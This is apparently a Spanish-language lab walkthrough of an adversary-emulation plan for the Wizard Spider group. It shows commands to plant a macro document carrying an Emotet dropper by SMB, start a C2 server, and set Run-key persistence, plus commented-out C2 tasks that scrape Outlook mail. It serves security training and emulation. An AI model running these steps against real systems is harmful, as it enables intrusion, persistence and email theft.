---
title: Plan de Emulación - Escenario 1 de Wizard Spider
---

# Preparación del entorno:
- Verificar conectividad a red
- En la maquina atante:
    - Instalar smbclient y verificar 
    
```bash
    sudo apt install smbclient  
    smbclient --version
```

![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-06-23 18-57-54.png)  
    
# FASE 1: COMPROMISO INICIAL – Emotet Dropper

Objetivo: Infectar a Dorothy con un documento Word malicioso que descarga y ejecuta una DLL simulando Emotet.

Procedimiento:


## 1. Subir el documento malicionso a Dorothy, colocarlo en el escritorio.

```bash
    smbclient -U 'oz\judy' //10.0.0.7/C$ -c "put wizard_spider/Resources/Emotet_Dropper/ChristmasCard.docm Users/judy/Desktop/ChristmasCard.docm;" "Passw0rd!"
```

![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-06-23 19-45-48.png) 

## 2. Iniciar servidor:

```bash
    cd ~/wizard_spider/Resources/control_server
    sudo ./controlServer
```

![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-06-23 19-51-11.png)  

## 3. Conectarte por RDP a Dorothy:

```bash
    xfreerdp +clipboard /u:oz\\judy /p:"Passw0rd!" /v:10.0.0.7
```

![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-06-23 19-23-27.png)  

## 4. Ejecutar ataque:

### 1. Ejecutar el dropper de Emotet 

Simular la acción del usuario al abrir el documento malicioso, lo que desencadenará la ejecución de Emotet.

- Dentro de la ventana de la sesión RDP de Dorothy, ve al escritorio del usuario Judy.
- Buscar el documento llamado ChristmasCard.docm.
- Hacer doble clic en el documento para abrirlo con Microsoft Word.
- Word mostrará una advertencia de seguridad sobre las macros. Habilita las macros cuando se te solicite. Esto es crítico para que el malware se ejecute.
- Después de habilitar las macros, deberías ver una ventana de terminal parpadeando brevemente (puede que apenas la notes) mientras se ejecuta la DLL de Emotet. - Espera unos segundos para que se complete la ejecución.

![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-06-23 20-14-11.png)  
![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-06-23 20-14-47.png)  


### 2. Confirmar la sesión

Verificar que Emotet se ha ejecutado correctamente en Dorothy y ha establecido una conexión con tu servidor de control en Kali.

- Volver a la terminal en tu máquina atacante (Kali Linux) donde se ejecuto 'sudo ./controlServer'.
- Visualizar un nuevo "callback" o sesión entrante en la salida del servidor. Esto indica que Emotet en Dorothy se ha conectado exitosamente. Busca mensajes que confirmen una nueva conexión o sesión.

![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-07-05 12-08-20.png)  


![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-07-05 12-18-10.png)  

![image.png](/assets/images/2025-06-08-emulacion/Captura desde 2025-07-07 19-50-51.png)  

--- 

# FASE 2: PERSISTENCIA de Emotet Registry Key

Este paso describe cómo el malware Emotet, una vez ejecutado en el sistema, establece su **persistencia**. La persistencia es una técnica utilizada por los atacantes para asegurar que el malware se reactive automáticamente cada vez que el sistema se reinicia o el usuario inicia sesión, garantizando su presencia continua en el equipo comprometido.

En este escenario, Emotet utiliza el **Registro de Windows** para lograr su persistencia. El Registro de Windows es una base de datos jerárquica que almacena configuraciones esenciales para el sistema operativo y las aplicaciones. La clave específica que Emotet manipula es una ubicación conocida donde los programas pueden registrarse para ejecutarse automáticamente al iniciar sesión el usuario.

Objetivo: Simular persistencia modificando el registro.

<!-- ## 1. Establecer persistencia:

En la terminal de la máquina atacante, ejecutar el siguiente comando:

```bash
    ./evalsC2client.py --set-task DOROTHY_DABB41A5 1
```

## 2. Confirmar en Dorothy que se creó la clave:
- Ruta: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
- Clave: blbdigital, Valor: rundll32.exe %userprofile%\Ygyhlqt\Bx5jfmo\R43H.dll,Control_RunDLL -->


## 1. Detalles de la Persistencia de Emotet

Emotet establece su persistencia creando una nueva entrada en la siguiente ruta del Registro:

  * **Ruta del Registro:** 
    ```
    HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
    ```
Dentro de esta ruta, Emotet añade una **clave** con un **valor** específico que le permite ejecutarse.

  * **Clave Creada:** `blbdigital`

      * Esta es la nueva entrada que Emotet inserta en la ruta del Registro. Sirve como un identificador para la carga útil del malware.

  * **Valor Asignado a la Clave:** `rundll32.exe %userprofile%\Ygyhlqt\Bx5jfmo\R43H.dll,Control_RunDLL`

      <!-- * Este valor es el comando que Windows ejecutará cuando el usuario `judy` inicie sesión. Desglosemos este comando:
          * `rundll32.exe`: Es una utilidad legítima de Windows que se usa para ejecutar funciones dentro de bibliotecas de vínculos dinámicos (DLL). Es comúnmente abusada por el malware para ejecutar sus propios archivos DLL sin levantar sospechas inmediatas, ya que `rundll32.exe` es un proceso legítimo del sistema.
          * `%userprofile%\Ygyhlqt\Bx5jfmo\R43H.dll`: Esta es la **ruta completa al archivo DLL malicioso de Emotet**.
              * `%userprofile%`: Es una variable de entorno de Windows que se expande a la ruta del directorio del perfil del usuario actual (por ejemplo, `C:\Users\judy`).
              * `\Ygyhlqt\Bx5jfmo\R43H.dll`: Indica que el archivo DLL malicioso llamado `R43H.dll` se encuentra anidado dentro de carpetas con nombres aparentemente aleatorios (`Ygyhlqt` y `Bx5jfmo`) dentro del perfil del usuario. Los nombres aleatorios son una táctica de evasión.
          * `,Control_RunDLL`: Especifica una función particular dentro del archivo `R43H.dll` que `rundll32.exe` debe invocar para ejecutar el malware. -->

<!-- **En resumen:** Al crear esta entrada en el Registro, Emotet asegura que cada vez que el usuario `judy` inicie sesión en el sistema `dorothy` (10.0.0.7), el archivo `R43H.dll` (que contiene el código de Emotet) se ejecutará automáticamente, manteniendo así el control sobre el sistema. -->

## 2. Verificación de la Persistencia (Paso Post-Ejecución)

Para verificar la persistencia descrita en el Paso 2, seguir estos pasos:

1.  **Completar el Paso 1:** Emotet debe haber sido ejecutado con éxito en el sistema `dorothy` (10.0.0.7) a través del documento `ChristmasCard.docm`.
2.  **Acceder al sistema Dorothy:** Si estás operando de forma remota, asegúrate de tener una conexión de RDP activa a `dorothy` como el usuario `judy`.
3.  **Abrir el Editor del Registro de Windows:**
      * Presiona `Windows + R` para abrir el cuadro de diálogo "Ejecutar".
      * Escribe `regedit.exe` y presiona `Enter`.
      * Acepta la solicitud de Control de Cuentas de Usuario (UAC) si aparece.
4.  **Navega a la Ruta de Persistencia:**
      * En el panel izquierdo del Editor del Registro, navega hasta la siguiente ruta:
        ```
        HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
        ```
5.  **Buscar la Clave de Emotet:**
      * En el panel derecho, busca una entrada (un valor de registro) con el nombre `blbdigital`.
6.  **Verifica el Valor:**
      * Haz doble clic en `blbdigital` para ver sus datos de valor.
      * Confirma que los "Datos del valor" coincidan exactamente con:
        ```
        rundll32.exe %userprofile%\Ygyhlqt\Bx5jfmo\R43H.dll,Control_RunDLL
        ```

Si encuentras la clave `blbdigital` con el valor especificado, habrás verificado con éxito que Emotet ha establecido su mecanismo de persistencia en el sistema.


<!-- 
--- 

# Fase 3: Descubrimiento de Host de Emotet y Recolección de Credenciales

## 1. Enumerar procesos:

Ejecuta en la terminal del cliente:

```bash
    ./evalsC2client.py --set-task DOROTHY_DABB41A5 2
```
Esto hará que Emotet enumere los procesos en Dorothy.

## 2. Descargar Outlook Scraper DLL:

```bash
    ./evalsC2client.py --set-task DOROTHY_DABB41A5 3
```
Emotet descargará la DLL del scraper de Outlook. 

## 3.  Cargar Outlook Scraper DLL:

```bash
    ./evalsC2client.py --set-task DOROTHY_DABB41A5 4
```
Emotet cargará la DLL en su espacio de memoria

## 4.  Extraer contenido de correo electrónico de Outlook:

```bash
    ./evalsC2client.py --set-task DOROTHY_DABB41A5 5
```
Emotet utilizará PowerShell para extraer información de correo electrónico.

## 5.  Extraer direcciones de correo electrónico:
```bash
    ./evalsC2client.py --set-task DOROTHY_DABB41A5 8
```
Emotet recolectará direcciones de correo electrónico. 


Se obtendra el acceso al usuario bill@oz.local para la siguiente fase.

```bash

```


```bash

``` -->


---


# posibles titulos:

    “Emulación Controlada de Wizard Spider, APT en un Entorno Simulado”

    “Aplicación de Técnicas de Adversary Emulation para la Comprensión de Wizard Spider en un Laboratorio Virtual”

    “Simulación de un Ataque de Wizard Spider: Un Enfoque Basado en Escenarios Reales”

    “Plan de Emulación de Wizard Spider en un Entorno Controlado#

    “Emulación Táctica de Wizard Spider: De Emotet a Ryuk”

    “Emulación Práctica de APTs: Wizard Spider en un Laboratorio Virtualizado”

    “Diseño y Ejecución de un Escenario de Emulación Basado en Wizard Spider”

    “Estudio Práctico del Comportamiento de Wizard Spider mediante Adversary Emulation con CALDERA y Técnicas MITRE ATT&CK”
